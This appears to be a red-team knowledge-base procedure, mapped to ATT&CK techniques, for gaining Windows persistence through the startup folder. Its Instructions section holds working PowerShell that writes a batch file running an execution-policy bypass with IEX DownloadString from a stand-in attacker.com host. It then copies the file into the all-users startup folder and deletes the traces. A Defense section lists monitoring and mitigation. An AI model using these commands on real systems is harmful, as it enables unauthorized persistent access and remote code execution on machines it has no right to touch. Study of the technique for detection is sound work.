---
id: 4227632a-32b7-48cd-bb26-7e8243e4097e
name: Windows-Startup-Elevated-Persistence-via-User-Startup-Folder
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:28.073534+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Persistence|TA0003 - Persistence]]'
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - >-
    [[techniques/Bypass User Account Control|T1088 - Bypass User Account
    Control]]
  - >-
    [[techniques/Registry Run Keys / Startup Folder|T1060 - Registry Run Keys /
    Startup Folder]]
sub_techniques: []
tags:
  - '[[tags/Elevated]]'
  - '[[tags/Startup Elevated]]'
  - '[[tags/Windows - Persistence]]'
commands:
  - '[[commands/powershell-create-batch-script]]'
  - '[[commands/powershell-copy-to-startup-folder]]'
platforms:
  - Windows
tools: []
validated: true
---

# Windows-Startup-Elevated-Persistence-via-User-Startup-Folder

## Summary

This procedure establishes persistence on a Windows system by creating and placing a batch script in the user startup folder, allowing it to execute automatically upon user login with the user's privilege level, which can include elevated administrative rights if the user is an admin. This method leverages the startup folder mechanism to run arbitrary commands or malware, potentially bypassing User Account Control (UAC) prompts in non-strict configurations.

## Description

The user startup folder in Windows is a designated location where files, such as batch scripts or shortcuts, are automatically executed when a user logs in. By placing a malicious batch script here, an attacker can ensure repeated execution of payloads without manual intervention. If the affected user has administrative privileges, the script runs elevated, enabling further post-exploitation activities like data exfiltration or lateral movement. This technique is particularly effective in environments with default UAC settings, as it does not always trigger prompts for startup items. The procedure assumes initial access to the system with user-level privileges and focuses on the all-users startup folder for broader impact, though it can be adapted for single-user scenarios. Detection relies on monitoring file creations in protected directories, and mitigation involves strict application whitelisting and privilege reduction.

## Requirements

1. Local user-level access to the target Windows system (administrative privileges on the user account enhance effectiveness).
2. PowerShell execution policy allowing script runs (or ability to bypass via execution policy changes).
3. Write access to the startup folder path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp (for all users) or %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup (for current user).
4. A predefined payload or commands to include in the batch script (e.g., download and execute malware).

## Defense

Defensive measures and detection strategies:

- Regularly monitor the startup folders (C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp and user-specific paths) for unauthorized batch files or executables using tools like Sysmon or Windows Event Logs (Event ID 4688 for process creation).
- Implement application whitelisting via AppLocker or Windows Defender Application Control to block unsigned or unauthorized scripts from executing.
- Enforce the principle of least privilege by limiting administrative access and enabling UAC in 'Always Notify' mode to prompt for elevations.
- Use endpoint detection and response (EDR) solutions to alert on anomalous file writes to startup directories or unexpected batch executions at login.

## Objectives

1. Establish long-term persistence on the compromised Windows system to survive reboots and logoffs.
2. Execute arbitrary commands or malware with the privileges of the logging-in user, potentially elevated if the user is an admin.
3. Bypass standard security measures like UAC for automated execution, maintaining stealthy access for further attacks such as data theft or lateral movement.

## Instructions

### Step 1: Create the Batch Script

**Context**: Begin by generating a batch file containing the desired persistence payload, such as launching a reverse shell or downloading additional tools. This step ensures the script is ready for placement and includes error handling to avoid detection.

**Command** ([[commands/powershell-create-batch-script]]):

```powershell
$batchContent = @'
@echo off
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
'@; Set-Content -Path "C:\temp\persistence.bat" -Value $batchContent -Force
```

> This PowerShell command creates a batch file at a temporary location with a sample payload that downloads and executes a remote script. Verify the file creation by checking its contents with Get-Content "C:\temp\persistence.bat". Expected output: Confirmation of file write (no errors) and the file containing the batch commands. If the path is inaccessible, adjust to a writable directory like $env:TEMP.

### Step 2: Copy Script to Startup Folder

**Context**: Move the batch script to the all-users startup folder to ensure execution on any login, maximizing persistence. This leverages the system's auto-execution without registry modifications, reducing footprint.

**Command** ([[commands/powershell-copy-to-startup-folder]]):

```powershell
Copy-Item -Path "C:\temp\persistence.bat" -Destination "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\persistence.bat" -Force
Remove-Item "C:\temp\persistence.bat" -Force
```

> This copies the script to the startup directory and cleans up the temporary file. Expected output: Successful copy confirmation (no access denied errors). Verify by listing the directory contents: dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp". Success is indicated if the file appears in the folder; test by logging off and on to confirm execution (monitor with Process Explorer for batch invocation).
